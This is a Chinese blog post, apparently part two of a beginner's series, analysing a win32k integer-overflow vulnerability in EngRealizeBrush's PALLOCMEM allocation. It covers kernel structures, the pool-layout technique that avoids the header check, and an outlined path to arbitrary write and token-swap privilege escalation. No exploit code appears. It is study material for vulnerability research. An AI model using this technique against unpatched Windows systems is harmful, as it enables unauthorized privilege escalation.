> 原文链接: https://www.anquanke.com//post/id/205870 


# 菜鸟的Windows内核初探（二）


                                阅读量   
                                **258860**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01335fe12bff890c38.jpg)](https://p2.ssl.qhimg.com/t01335fe12bff890c38.jpg)



## 前言

首先强烈安利一个师傅：小刀志师傅，人超级好，问题基本秒回，超级耐心。（附上师傅博客的传送门：[https://xiaodaozhi.com/）。](https://xiaodaozhi.com/%EF%BC%89%E3%80%82)

这篇文章承接菜鸟的Windows内核初探（一），环境配置是一样的，使用的工具和系统也是一样的，所以这里就不再赘述。



## 1、漏洞简单介绍

这个漏洞是结合整数上溢，对PALLOCMEM的内存分配参数进行溢出构造，使得对ENGBRUSH进行成员变量赋值的时候，对下一个SURFACE变量进行覆盖，从而达到可控范围扩大，通过Windows Api，对SURFACE中的成员指针进行修改，从而达到任意地址写的目的，将指针指向自己写的shellcode，从而达到本地提权的目的。提权的方法是将System进行的token对目标进程的token进行替换。

漏洞影响版本：Windows Vista，Windows Server 2008，Windows Server 2012，Windows 7，Windows 8。



## 2、先验知识

### <a class="reference-link" name="2.1%20%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"></a>2.1 相关数据结构

#### <a class="reference-link" name="2.1.1%20ENGBRUSH"></a>2.1.1 ENGBRUSH

```
typedef struct _ENGBRUSH
`{`
  DWORD dwUnknown00; // 000 00000000 
  ULONG cjSize;      // 004 00000144 length of the allocation
  DWORD dwUnknown08; // 008 00000000 
  DWORD dwUnknown0c; // 0c0 00000000
  DWORD cxPatRealized; // 010 0000000c 
  SIZEL sizlBitmap;        // 014 00000008 00000008 
  DWORD cjScanPat; // 01C 00000018 flags?
  PBYTE pjBits;      // 020 e13fabf8 
  DWORD dwUnknown24; // 024 00000000 
  DWORD dwUnknown28; // 028 00000000 
  DWORD dwUnknown2c; // 02C 00000000
  DWORD dwUnknown30; // 030 00000000 
  DWORD dwUnknown34; // 034 00000000 
  DWORD dwUnknown38; // 038 00000000 
  DWORD iFormat; // 03C 00000004 == EBRUSHOBJ:ulDCPalTime?
  BYTE aj[4];
`}` ENDBRUSH, *PENGBRUSH;
```

使用PALLOCMEM申请内存时的TAG为”Gebr”

#### <a class="reference-link" name="2.1.2%20BRUSHOBJ"></a>2.1.2 BRUSHOBJ

```
typedef struct _BRUSHOBJ `{`
  ULONG iSolidColor;
  PVOID pvRbrush;
  FLONG flColorType;
`}` BRUSHOBJ;
```

iSolidColor：指定实心笔刷的颜色索引。该索引已转换为目标表面的调色板。绘图可以继续进行，而无需实现画笔。值0xFFFFFFFF表示必须实现非实心画笔。<br>
pvRbrush：指向驱动已实现的画笔指针<br>
flColorType：指定一个FLONG值，其中包含描述此画笔对象的标志。

#### <a class="reference-link" name="2.1.3%20EBRUSHOBJ"></a>2.1.3 EBRUSHOBJ

```
typedef struct _EBRUSHOBJ
`{` //                             W2k WXP
  BRUSHOBJ    brushobj;       // 000 000
  COLORREF    crRealize;      // 00C 00C : 00808080 == ulRGBColor
  ULONG       ulRGBColor;     //     010 : see above
  PENGBRUSH   pengbrush;      // 014     : 00000000 
  ULONG       ulSurfPalTime;  // 018     : 002521c7 
  ULONG       ulDCPalTime;    // 01C 01C : 002521c8
  COLORREF    crCurrentText;  // 020     : 00000000 
  COLORREF    crCurrentBack;  // 024     : 00ffffff 
  COLORADJUSTMENT * pca;      // 028     : e1b632c8 , pointer to DCOBJ.dcLevel.ca
  HANDLE      hColorTransform;// 02c     : 00000000
  FLONG       flFlags;        // 030     : 00000000 , If hCT has handle, bit 0x0002 is set
  SURFACE *   psurfTrg;       // 034 034 : e1fb9a10 -&gt; 'Gla5' (surface), gdikdx says psoTarg1
  PPALETTE    ppalSurf;       // 038 038 : e1a11558 -&gt; 'Gla8' (palette), gdikdx says palSurf1
  PPALETTE    ppalDC;         // 03c 03C : e19f24b8 -&gt; 'Gh08' (palette), gdikdx says palDC1
  PPALETTE    ppal3;          // 040     : e1a11558 -&gt; 'Gla8' (palette)
  DWORD       dwUnknown44;    // 044     : 00000006 
  BRUSH *     pbrush;         // 048     : e1726b68 -&gt; 'Gla@' (brush)
  FLONG       flattrs;        // 04c     : 80040214
  DWORD       ulUnique;       // 050 050 : identical to BRUSH.ulUniqueBrush
#if (NTDDI_VERSION &gt;= NTDDI_WINXP)
  DWORD       dwUnknown54;    //     054 : 00000001 
  DWORD       dwUnknown58;    //     058 : 00000000 
#endif
`}` EBRUSHOBJ, *PEBRUSHOBJ;
```

#### <a class="reference-link" name="2.1.4%20SURFOBJ"></a>2.1.4 SURFOBJ

```
typedef struct _SURFOBJ
`{`
    DHSURF dhsurf;           // 0x000 
    HSURF  hsurf;            // 0x004 
    DHPDEV dhpdev;           // 0x008 
    HDEV   hdev;             // 0x00c
    SIZEL  sizlBitmap;       // 0x010 
    ULONG  cjBits;           // 0x018 
    PVOID  pvBits;           // 0x01c 
    PVOID  pvScan0;          // 0x020 
    LONG   lDelta;           // 0x024 
    ULONG  iUniq;            // 0x028 
    ULONG  iBitmapFormat;    // 0x02c 
    USHORT iType;            // 0x030 
    USHORT fjBitmap;         // 0x032 
  // size                       0x034
`}` SURFOBJ, *PSURFOBJ;
```

Dhsurf：假如表面时设备管理，这表示设备的句柄，否则这个变量的值为0<br>
Hsurf：表面句柄<br>
Dhpdev：GDI与此设备关联的PDEV的逻辑句柄<br>
sizlBitmap：指定SIZEL结构，该结构包含曲面的宽度和高度（以像素为单位）<br>
cjBits：指定pvBits指向的缓冲区的大小。<br>
pvBits：如果表面是标准格式的位图，则这是指向表面像素的指针。对于BMF_JPEG或BMF_PNG图像，这是指向包含JPEG或PNG格式的图像数据的缓冲区的指针。否则，此成员为NULL。<br>
pvScan0：指向位图的第一条扫描线的指针。如果iBitmapFormat为BMF_JPEG或BMF_PNG，则此成员为NULL。<br>
lDelta：指定在位图中向下移动一条扫描线所需的字节数。如果iBitmapFormat为BMF_JPEG或BMF_PNG，则此成员为NULL。<br>
iUniq：指定指定表面的当前状态。每次表面变化时，该值都会增加。这使驱动程序可以缓存源表面。对于不应缓存的表面，iUniq设置为零。此值与的BMF_DONTCACHE标志一起使用fjBitmap。<br>
iBitmapFormat：指定最接近此曲面的标准格式。如果iType成员指定位图（STYPE_BITMAP），则此成员指定其格式。基于NT的操作系统支持一组预定义的格式，尽管应用程序也可以使用SetDIBitsToDevice发送设备特定的格式。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017959786bf320c241.png)

iType：曲面类型

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012c94c700b49c6b6a.png)

fjBitmap如果曲面的类型为STYPE_BITMAP，并且是标准的未压缩格式位图，则可以设置以下标志。否则，应忽略此成员。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0146f07b455a0626ba.png)

#### <a class="reference-link" name="2.1.5%20SURFACE"></a>2.1.5 SURFACE

```
typedef struct _SURFACE
`{`                            // Win XP
    BASEOBJECT BaseObject;   // 0x000
    SURFOBJ    surfobj;      // 0x010
    XDCOBJ *   pdcoAA;       // 0x044
    FLONG      flags;        // 0x048
    PPALETTE   ppal;         // 0x04c verified, palette with kernel handle, index 13
    WNDOBJ     *pWinObj;     // 0x050 NtGdiEndPage-&gt;GreDeleteWnd
    union                    // 0x054
    `{`
        HANDLE hSecureUMPD;  // if UMPD_SURFACE set
        HANDLE hMirrorParent;// if MIRROR_SURFACE set
        HANDLE hDDSurface;   // if DIRECTDRAW_SURFACE set
    `}`;
    SIZEL      sizlDim;      // 0x058
    HDC        hdc;          // 0x060 verified
    ULONG      cRef;         // 0x064
    HPALETTE   hpalHint;     // 0x068 
    HANDLE     hDIBSection;  // 0x06c for DIB sections
    HANDLE     hSecure;      // 0x070
    DWORD      dwOffset;     // 0x074
    UINT       unk_078;      // 0x078
 // ... ?
`}` SURFACE, *PSURFACE; // static unsigned long SURFACE::tSize == 0x7C, sometimes 0xBC
```

#### <a class="reference-link" name="2.1.6%20SIZEL"></a>2.1.6 SIZEL

```
typedef struct tagSIZEL `{`
    LONG cx;
    LONG cy;
`}` SIZEL, *PSIZEL;
```

Cx:指定矩形的宽度。<br>
Cy:指定矩形的高度

#### <a class="reference-link" name="2.1.7%20PATRECT"></a>2.1.7 PATRECT

```
typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;
```

函数PolyPatBlt的参数 pPoly 指向的数组的元素个数需要与参数 Count 参数表示的矩形个数对应。结构体中第 5 个成员变量 hBrush，这个成员变量很有意思。通过逆向分析相关内核函数得知，如果数组元素的该成员置为空值，那么在内核中处理该元素时将使用先前被选择在当前设备上下文 DC 对象中的笔刷对象作为实现 ENGBRUSH 对象的逻辑笔刷；而如果某个元素的 hBrush 成员指定了具体的笔刷对象句柄，那么在 GrePolyPatBltInternal 函数中将会对该元素使用指定的笔刷对象作为实现 ENGBRUSH 对象的逻辑笔刷。

#### <a class="reference-link" name="2.1.8%20DEVBITMAPINFO"></a>2.1.8 DEVBITMAPINFO

```
typedef struct _DEVBITMAPINFO `{` // dbmi
    ULONG   iFormat;
    ULONG   cxBitmap;
    ULONG   cyBitmap;
    ULONG   cjBits;
    HPALETTE hpal;
    FLONG   fl;
`}` DEVBITMAPINFO, *PDEVBITMAPINFO;
```

#### <a class="reference-link" name="2.1.9%20DIBDATA"></a>2.1.9 DIBDATA

```
typedef struct tagDIBDATA `{`
  LONG       PaletteVersion;
  DIBSECTION DibSection;
  HBITMAP    hBitmap;
  HANDLE     hMapping;
  BYTE       *pBase;
`}` DIBDATA;
```

PaletteVersion：调色板版本<br>
DibSectionDIBSECTION：结构包含有关DIB的信息。<br>
hBitmap：位图的句柄<br>
hMapping：处理用于在GDI和CImageSample对象之间共享内存的文件映射对象的句柄。<br>
pBase：位图的基址

### <a class="reference-link" name="2.1.10%20POOL_HEADER"></a>2.1.10 POOL_HEADER

```
typedef struct _POOL_HEADER
`{`
     union
     `{`
          ULONG PreviousSize: 9;
          struct
          `{`
               ULONG PoolIndex: 7;
               ULONG BlockSize: 9;
               ULONG PoolType: 7;
          `}`;
          ULONG Ulong1;
     `}`;
     union
     `{`
          ULONG PoolTag;
          struct
          `{`
               WORD AllocatorBackTraceIndex;
               WORD PoolTagHash;
          `}`;
     `}`;
`}` POOL_HEADER, *PPOOL_HEADER;
```

这个结构式使用ExAllocatePoolWithTag分配内存时，每个内存块的头部会存放的数据结构，大小一共8个字节

### <a class="reference-link" name="2.2%20%E7%9B%B8%E5%85%B3API%E5%87%BD%E6%95%B0"></a>2.2 相关API函数

#### <a class="reference-link" name="2.2.1%20PALLOCMEM%EF%BC%88%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E7%BB%93%E6%9E%9C%EF%BC%89"></a>2.2.1 PALLOCMEM（反编译的结果）

```
void *__stdcall PALLOCMEM(size_t a1, ULONG Tag)
`{`
  PVOID v2; // esi@1
  PVOID v3; // eax@2

  v2 = 0;
  if ( a1 )
  `{`
    v3 = Win32AllocPool(a1, Tag);
    v2 = v3;
    if ( v3 )
      memset(v3, 0, a1);
  `}`
  return v2;
`}`
```

#### <a class="reference-link" name="2.2.2%20EngRealizeBrush"></a>2.2.2 EngRealizeBrush

```
int __stdcall EngRealizeBrush(
    struct _BRUSHOBJ *pbo,       // a1
    struct _SURFOBJ *psoTarget,  // a2
    struct _SURFOBJ *psoPattern, // a3
    struct _SURFOBJ *psoMask,    // a4
    struct _XLATEOBJ *pxlo,      // a5
    unsigned __int32 iHatch      // a6
);
```

其中的第 1 个参数 pbo 指向目标 BRUSHOBJ 笔刷对象。参数 psoTarget / psoPattern / psoMask 都是指向 SURFOBJ 类型对象的指针。<br>
①参数 pbo 指向存储笔刷详细信息的 BRUSHOBJ 对象；该指针实际上指向的是拥有更多成员变量的子类 EBRUSHOBJ 对象，除 psoTarget 之外的其他参数的值都能从该对象中获取到。<br>
②参数 psoTarget 指向将要实现笔刷的目标 SURFOBJ 对象；该表面可以是设备的物理表面，设备格式的位图，或是标准格式的位图。<br>
③参数 psoPattern 指向为笔刷描述图案的 SURFOBJ 对象；对于栅格化的设备来说，该参数是位图。<br>
④参数 psoMask 指向为笔刷描述透明掩码的 SURFOBJ 对象。<br>
⑤参数 pxlo 指向定义图案位图的色彩解释的 XLATEOBJ 对象。

#### <a class="reference-link" name="2.2.3%20POLYPATBLT"></a>2.2.3 POLYPATBLT

```
BOOL PolyPatBlt(
    HDC hdc,
    DWORD rop,
    PVOID pPoly,
    DWORD Count,
    DWORD Mode
);
```

函数通过使用当前选择在指定设备上下文 DC 对象中的笔刷工具来绘制指定数量的矩形。第 1 个参数 hdc 是传入的指定设备上下文 DC 对象的句柄，矩形的绘制位置和尺寸被定义在参数 pPoly 指向的数组中，参数 Count 指示矩形的数量。笔刷颜色和表面颜色通过指定的栅格化操作来关联，参数 rop 表示栅格化操作代码。参数 Mode 可暂时忽略。

#### <a class="reference-link" name="2.2.4%20CreateBitmap"></a>2.2.4 CreateBitmap

```
HBITMAP CreateBitmap(
  int        nWidth,
  int        nHeight,
  UINT       nPlanes,
  UINT       nBitCount,
  const VOID *lpBits
);
```

函数的功能是创建指定高度、宽度和颜色格式（颜色平面、每个像素用几个表示）的位图。前四个参数比较好理解，最后一个参数lpBits指向用于在像素矩形中设置颜色的颜色数据数组的指针。矩形中的每条扫描线必须是字对齐的（非字对齐的扫描线必须用零填充）。如果此参数为NULL，则新位图的内容未定义。

#### <a class="reference-link" name="2.2.5%20CreatePatternBrush"></a>2.2.5 CreatePatternBrush

```
HBRUSH CreatePatternBrush(
  HBITMAP hbm
);
```

这个函数主要就是通过传入BITMAP参数之后得到BRUSH对象。

#### <a class="reference-link" name="2.2.6%20hbmCreateClone"></a>2.2.6 hbmCreateClone

```
HBITMAP hbmCreateClone(
SURFACE *pSurfSrc,
 ULONG cx, 
ULONG cy
)；
```

函数是通过传入SURFACE对象指针获得位图对象的克隆句柄

#### <a class="reference-link" name="2.2.7%20CreateDIB"></a>2.2.7 CreateDIB

```
HRESULT CreateDIB(
        LONG    InSize,
  [ref] DIBDATA &amp;DibData
);
```

InSize位图的大小<br>
[ref] DIBDATA &amp;DibData引用DIBDATA结构

#### <a class="reference-link" name="2.2.8%20RegisterClassExA"></a>2.2.8 RegisterClassExA

```
ATOM RegisterClassExA(
  const WNDCLASSEXA *Arg1
);
```

注册一个窗口类

#### <a class="reference-link" name="2.2.9%20SetBitmapBits"></a>2.2.9 SetBitmapBits

```
LONG SetBitmapBits(
  HBITMAP    hbm,
  DWORD      cb,
  const VOID *pvBits
);
```

将位图的颜色数据位设置成指定值。也是我们实现任意地址写的关键函数

### <a class="reference-link" name="2.3%20Windows%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86"></a>2.3 Windows内存管理部分知识

在 Windows 系统中，调用 ExAllocatePoolWithTag 分配不超过 0x1000 字节长度的池内存块时，会使用到 POOL_HEADER 结构，作为分配的池内存块的头部。可以通过Windbg查看POOL_HEADER的结构。通过联合的方式可以知道POOL_HEADER的大小一共只有8个字节

[![](https://p0.ssl.qhimg.com/t01949f5a066865b736.png)](https://p0.ssl.qhimg.com/t01949f5a066865b736.png)

当分配的内存块小于 0x1000 字节时，内存块大小越大，其被分配在内存页首地址的概率就越大。而分配较小内存缓冲区时，内核将首先搜索符合当前请求内存块大小的空间，将内存块优先安置在这些空间中。

在调用 ExFreePoolWithTag 函数释放先前分配的池内存块时，系统会校验目标内存块和其所在内存页中相邻的块的 POOL_HEADER 结构；如果检测到块的 POOL_HEADER 被破坏，将会抛出导致系统 BSOD 的 BAD_POOL_HEADER 异常。**但在一种情况下例外：那就是如果该池内存块位于所在的内存页的末尾，那么在这次 ExFreePoolWithTag 函数调用期间将不会对相邻内存块进行这个校验。**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f4c0916ee0a17192.png)

所以为了达到利用的效果而不知仅仅做到BOSD，我们需要尽可能让漏洞函数（PALLOCMEM）分配内存空间的时候尽可能在内存页末尾，这样就可以使得系统不会检测POOL_HEADER，也就不会变成蓝屏了。

### <a class="reference-link" name="2.4%20CreateBitmap%E6%9E%84%E9%80%A0%E6%8C%87%E5%AE%9A%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%9A%84%E4%BD%8D%E5%9B%BE"></a>2.4 CreateBitmap构造指定内存大小的位图

CreateBitmap（nWidth,nHeight,nPlanes,nBitCount）当分配位图的宽度(nWidth)为 4 的倍数且像素位数格式(nPlanes)为 8 位时，位图像素数据的大小直接等于宽度(nWidth)和高度(nHeight)的乘积。

也就是说，可以通过指定CreatBitmap的参数，在内存中分配指定大小的内存空间。这个先验知识为后续的内存布局做好准备



## 3、静态分析+动态调试

为了更好的对漏洞原理进行分析，本章采用动静态结合的方式进行阐述。先对原理进行静态分析，接着一节就对分析进行动态验证。

### <a class="reference-link" name="3.1%20PALLOCMEM%E4%B9%8Bsize%E5%8F%82%E6%95%B0%E5%88%86%E6%9E%90"></a>3.1 PALLOCMEM之size参数分析

在第一章的漏洞介绍中提到了，这是一个与整数溢出的相关漏洞，具体的漏洞函数就是PALLOCMEM这个内存分配函数。为了搞懂这个漏洞，最好的就是对这个函数中的参数size进行一下分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cefe3c2afcf9978e.png)

为了便于理解，对反编译代码中的变量进行有意义的替换（根据补丁后的代码）。通过下面的代码可以知道通过获取的ulSizeTotal对ENGBRUSH对象实例pengbrush调用PALLOCMEM进行内存申请。如果说对获取的ulSizeTotal数值的几个变量进行特殊的构造，那么就有可能使得ulSizeTotal整数溢出，使得ulSizeTotal远小于本来应该得到的值，那么当程序通过ALLOCMEM进行内存申请的时候就会被分配到一个非常小的内存空间给，ENGBRUSH对象实例。那么后续对ENGBRUSH对象实例的各个成员变量进行初始化的时候将有可能发生缓冲区溢出、造成后续的内存块数据被覆盖的可能性，严重时将导致操作系统 BSOD 的发生。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014f9e25eecfc907c2.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017e5e36b5ffce1984.png)

接下来就分析ulSizeTotal的值与哪些变量有关。在哪之前需要注意一个全局变量gpCachedEngbrush，这个全局变量的作用就是：创建的 ENGBRUSH 对象在释放时会尝试将地址存储在这个全局变量中，而不是直接释放掉。下次分配时如果有合适的内存大小，将不申请内存而是直接使用缓存。在 EngRealizeBrush 函数中分配内存缓冲区之前，函数会获取 gpCachedEngbrush 全局变量存储的值，如果缓存的 ENGBRUSH 对象存在，那么判断该缓存对象是否满足当前所需的缓冲区大小，如果满足就直接使用该缓存对象作为新创建的 ENGBRUSH 对象的缓冲区使用，因此跳过了分配内存的那一步。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01384717afa98933dd.png)

通过静态分析可以知道。粗略来讲一共有两处地方可以决定ulSizeTotal的大小。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0199db91f52dde30ba.png)

先从第二个红框开始分析。可以用一个流程图来总结一下，比较直观。溯源到最后也就是说这部分的ulSizeTotal都是跟a4这个参数有关的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c84feafbfab442b7.png)

观察一下a4这个参数。知道a4为EngRealizeBrush函数形参，一个SURFOBJ对象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018cc8b8768f75c722.png)

之后有一个名叫SURFOBJ_TO_SURFACE的函数，通过IDA可以知道该函数就是将传入的类型为SURFOBJ的参数指向-0x10处。这个地方按理说是不寻常的，但是根据SURFACE的结构可以知道，SURFACE偏移0x10处就是SURFOBJ，所以-0x10就是指向SURFACE

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01aaca8296d4e3a4b0.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c633e51e128ab6f7.png)

接着就是要分析**((_DWORD **)pSurfMsk + 8)和**((_DWORD **)pSurfMsk + 9)。首先我们知道pSurfMsk 这个的类型是SURFACE，那么**((_DWORD **)pSurfMsk + 8)和**((_DWORD **)pSurfMsk + 9)就是偏移0x20和0x24的位置。因为SURFOBJ在SURFACE偏移为0x10处，并且SURFOBJ的大小是0x34，所以以上两个偏移在SURFOBJ分别是0x10和0x14，对应一下就是sizlBitmap。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e90d7fd4d28b8ed2.png)

而根据SIZEL的结构定义可以知道这两个分别就是代表像素图的宽和高。此次对于第二个ulSizeTotal的分析就比较明确了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014fa6dc0cf6f00958.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fe926f72d5597f2b.png)

接下来分析第一个部分的ulSizeTotal。大致的分析借助上面的方法也分析一些出来。这里没有列出v11和v8的原因是这两个变量的流程比较复杂。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0173dd35f4798b8d0b.png)

在分析v11之前有一个地方需要注意一下，v11的取值是根据a3进行switch匹配的，但是此时的a3并不是参数a3而是a2-&gt;iBitmapFormat。这个可以根据结构的偏移算一下得到（15*4=0x3c，在SURFACE偏移0x3c，那么在SURFOBJ中偏移0x2c，对应的就是iBitmapFormat）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010627b72fccc08b70.png)

下面就来分析一些v11。逻辑还是蛮简单的，就是对应不同的iBitmapFormat的值对v11附不同的值，当iBitmapFormat的值（BMF_1BPP、BMF_4BPP 、BMF_8BPP ….），v11就赋给其中的一个像素用几位来表示的那个位数（1、4、8….）。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fe203567de872c3d.png)

v8的构成就稍微复杂一些。函数开始v8就是只是代表a3像素图的宽度

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016cb63ac9b3b68311.png)

然后还是在对a2像素图格式的判断中也有一些操作，但是这个操作比较迷，并不知道这是要干嘛（可能图的宽度和像素位有一定的联系吧）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016431857a8ab8bab2.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015c4a35b56fb6b88c.png)

这样除了v8那部分还不是特别清楚以外可以把第一个红框中的ulSizeTotal的流程图得到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012d0326b9dd979912.png)

